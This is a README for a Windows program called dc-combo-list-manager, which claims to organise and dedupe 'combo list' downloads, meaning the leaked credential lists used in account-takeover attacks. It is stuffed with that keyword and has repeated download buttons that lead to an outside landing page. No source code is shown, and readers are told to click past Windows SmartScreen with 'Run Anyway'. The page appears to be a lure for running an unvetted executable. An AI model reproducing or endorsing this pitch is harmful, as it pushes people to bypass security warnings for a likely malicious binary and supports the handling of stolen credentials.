<div align="center">

<img src="assets/banner.svg" width="100%" alt="Combo List Download banner"/>

# dc-combo-list-manager 🧵🚀

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*A weekend project that grew into the tidiest way to organize, dedupe, and manage combo list downloads on Windows.*

<p align="center">
  <a href="https://AdvocateBoost.github.io/dc-combo-list-manager/">
    <img src="https://img.shields.io/badge/GET-Combo_List_Download_2026-2563EB?style=for-the-badge&logo=windows&logoColor=white&labelColor=1D4ED8" width="550" alt="Download"/>
  </a>
</p>
</div>

## 🌱 Overview

I built `dc-combo-list-manager` on a rainy Saturday because I got tired of juggling a dozen text files with cryptic names, no timestamps, and duplicate lines eating up disk space for no reason. What started as a single Python script to sort my own local combo list download folder turned into a full desktop manager with a real UI, a real database layer, and a real reason to exist. This is a proud, hand-built indie tool — no VC funding, no bloated Electron shell pretending to be native, just a lean Windows app that does one job and does it well.

The core idea is simple: **combo list download management is a data hygiene problem**, not a mystery. Files pile up, formats drift, encodings clash, and duplicate entries silently multiply. `dc-combo-list-manager` exists to bring order to that chaos — indexing files, normalizing line endings, flagging duplicates, and giving you a searchable, sortable, exportable view of everything sitting in your combo list download directory.

This project is for anyone who manages large collections of text-based list files and wants a dedicated, purpose-built tool instead of hacking together spreadsheet macros or one-off scripts. Researchers, QA testers, dataset curators, and hobbyist archivists have all told me they use it — and honestly, seeing that adoption is the best part of shipping an indie side project into the open.

> [!NOTE]
> This tool is a **file management and organization utility**. It does not generate, scrape, or validate list contents against any live service. It simply helps you download, store, sort, and inspect combo list files you already have or acquire legitimately.

<p align="center">

  <a href="https://AdvocateBoost.github.io/dc-combo-list-manager/">

    <img src="https://img.shields.io/badge/GET-Combo_List_Download_2026-2563EB?style=for-the-badge&logo=windows&logoColor=white&labelColor=1D4ED8" width="550" alt="Download"/>

  </a>

</p>

---

## 🔥 What Makes It Tick

- **Smart Deduplication Engine** — hashes every line across your entire combo list download library and collapses exact + fuzzy duplicates without ever touching your original files.

- **Batch Folder Watching** — point it at a directory and it silently tracks new arrivals, so your combo list download queue stays current without manual refreshing.

- **Encoding Autopilot** — detects UTF-8, UTF-16, and legacy Latin-1 text files automatically, so mojibake garbage never sneaks into your merged output.

- **Split & Merge Toolkit** — chop massive files into manageable chunks or stitch dozens of small lists into one clean master file in a couple of clicks.

- **Tagging & Categorization** — attach custom labels to list files (source, date, size tier) so your combo list download archive reads like a library, not a junk drawer.

- **Instant Search Index** — full-text search across thousands of lines in milliseconds thanks to an in-memory index built at load time.

- **Export Presets** — one-click export to `.txt`, `.csv`, or delimited formats tailored for whatever downstream tool you're feeding.

- **Portable Mode** — runs entirely from a single folder with zero registry writes, perfect for USB drives or locked-down machines.

> [!TIP]
> Enable **Portable Mode** from Settings before your first import if you want the entire app + database to live in one relocatable folder.

---

## 🏁 How To Get Started

1. Visit the landing page and grab the latest build — the download button above always points to the current release.

2. Extract the downloaded folder anywhere you like (Desktop, a USB stick, wherever).

3. Double-click `dc-combo-list-manager.exe` — no installer wizard, no admin prompt required.

4. Drop your first combo list download files into the "Import" panel and watch the index build itself.

> [!IMPORTANT]
> Windows SmartScreen may flag the first launch simply because the binary is freshly signed and low-reputation. Click **More Info → Run Anyway**. This is normal for small indie tools without an EV certificate budget.

---

## 💻 System Requirements

| Requirement | Details |
|---|---|
| OS | Windows 10 (64-bit) or Windows 11 |
| RAM | 4 GB minimum, 8 GB recommended for very large libraries |
| Disk | ~150 MB for the app, plus space for your imported files |
| Dependencies | None — fully standalone, no runtime installs needed |
| .NET / Java | Not required |

![Standalone](https://img.shields.io/badge/dependencies-none-success?style=flat-square) ![Build](https://img.shields.io/badge/build-passing-brightgreen?style=flat-square) ![Status](https://img.shields.io/badge/status-actively%20maintained-blue?style=flat-square)

---

## ⚙️ How It Works

The architecture behind `dc-combo-list-manager` is deliberately boring — in a good way. Boring means predictable, and predictable means your combo list download workflow never surprises you.

1. **Ingest** — files are dropped into the watch folder or imported manually through the UI.

2. **Normalize** — encoding detection and line-ending cleanup run automatically on every file.

3. **Index** — a lightweight in-memory index is built for instant search and dedup lookups.

4. **Organize** — tags, categories, and merge/split operations are applied on top of the index.

5. **Export** — cleaned, organized output is written back out in your chosen format.

```mermaid
flowchart LR
    Ingest --> Normalize
    Normalize --> Index
    Index --> Organize
    Organize --> Export
```

> [!NOTE]
> Nothing is ever modified in place. Original imported files stay untouched in a `raw/` subfolder — all cleanup happens on working copies.

---

## 🧩 Troubleshooting

<details>
<summary><strong>The app says a file is "locked" during import — what gives?</strong></summary>

Another program (often an antivirus scanner) has the file open. Wait a few seconds and retry, or copy the file to a fresh folder before importing.

</details>

<details>
<summary><strong>My combo list download folder has thousands of tiny files — will it choke?</strong></summary>

No. The indexer batches reads and streams them rather than loading everything into RAM at once. Expect a brief "Building Index" progress bar on first load, then instant performance after.

</details>

<details>
<summary><strong>Deduplication removed lines I wanted to keep — how do I undo it?</strong></summary>

Every dedup pass writes to a new output file by default; your original stays in `raw/`. If you overwrote manually, check the `.bak` snapshot created automatically before each destructive action.

</details>

<details>
<summary><strong>Search results feel stale after adding new files.</strong></summary>

Hit `Ctrl+R` to force a manual re-index, or enable **Auto-Reindex on Focus** in Settings so it happens whenever you switch back to the window.

</details>

<details>
<summary><strong>Can I run this on macOS or Linux?</strong></summary>

Not currently — this is a Windows-first build by design, tuned specifically for the Win32 file APIs. A cross-platform port is on the long-term wishlist.

</details>

---

## 🎨 UI, Themes & Shortcuts

The interface is intentionally minimal — dark by default because that's what I stare at for hours anyway.

| Shortcut | Action |
|---|---|
| `Ctrl+O` | Open / import file |
| `Ctrl+F` | Focus search bar |
| `Ctrl+D` | Run deduplication on active list |
| `Ctrl+M` | Merge selected files |
| `Ctrl+R` | Force reindex |
| `Ctrl+,` | Open Settings |

Settings include:

- Light / Dark / High-Contrast themes

- Adjustable index refresh interval

- Configurable dedup sensitivity (exact vs. fuzzy match threshold)

- Custom export delimiter and encoding defaults

> [!WARNING]
> Setting fuzzy-match sensitivity too aggressively can merge lines that only *look* similar. Start conservative and loosen it once you trust your dataset.

---

## 🤝 Contributing & Community

This started as a solo passion project, but it doesn't have to stay that way. Issues, feature requests, and pull requests are genuinely welcome — I read every single one.

- Found a bug? Open an issue with your Windows version and a sample (sanitized) file if possible.

- Have an idea for a new export preset? PRs with tests are fast-tracked.

- Want to just say the tool helped you out? That means more than you'd think for a two-person indie effort.

---

## 📜 License

Released under the [MIT License](LICENSE), 2026. Do what you want with it — build on it, fork it, ship your own combo list download spinoff. Just keep the credit intact.

---

## ⚠️ Disclaimer

`dc-combo-list-manager` is a general-purpose file organization and deduplication utility. It is provided "as is" with no warranty of any kind. The maintainers are not responsible for how imported or exported files are used. Always ensure you have the rights to any data you manage with this tool and comply with applicable laws and terms of service wherever your files originate.

<p align="center">

  <a href="https://AdvocateBoost.github.io/dc-combo-list-manager/">

    <img src="https://img.shields.io/badge/GET-Combo_List_Download_2026-2563EB?style=for-the-badge&logo=windows&logoColor=white&labelColor=1D4ED8" width="550" alt="Download"/>

  </a>

</p>